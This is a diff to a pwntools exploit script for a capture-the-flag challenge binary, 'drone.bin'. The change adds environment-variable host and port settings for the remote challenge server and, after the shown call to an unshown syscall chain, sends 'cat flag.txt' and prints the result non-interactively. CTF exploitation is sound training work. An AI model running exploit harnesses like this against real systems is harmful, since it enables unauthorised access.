@@ -1,6 +1,7 @@
 from pwn import *
+import os
 
-binary = args.BIN or "../attachments/drone.bin"
+binary = args.BIN or "attachments/drone.bin"
 
 context.terminal = ["tmux", "splitw", "-h"]
 e = context.binary = ELF(binary)
@@ -12,7 +13,9 @@ continue
 """
 
 
-if args.REMOTE:
+ENV_HOST = os.environ.get("HOST")
+ENV_PORT = os.environ.get("PORT")
+if args.REMOTE or ENV_HOST:
     TIMEOUT = 0.5
 else:
     TIMEOUT = 0.1
@@ -21,9 +24,9 @@ def get_remote():
     if args.GDB:
         # return gdb.debug(e.path, gdbscript=gs)
         return e.debug(gdbscript=gs)
-    elif args.REMOTE:
-        HOST = args.HOST or "2024.sunshinectf.games"
-        PORT = int(args.PORT or 24004)
+    elif args.REMOTE or ENV_HOST:
+        HOST = ENV_HOST or args.HOST or "2024.sunshinectf.games"
+        PORT = int(ENV_PORT or args.PORT or 24004)
         return remote(HOST, PORT)
     else:
         return process(e.path)
@@ -78,5 +81,5 @@ syscall_chain()
 
 pause(1)
 p.sendline(b'cat flag.txt')
-
-p.interactive()
+sleep(0.5)
+print(p.recvrepeat(2).decode(errors='replace'))
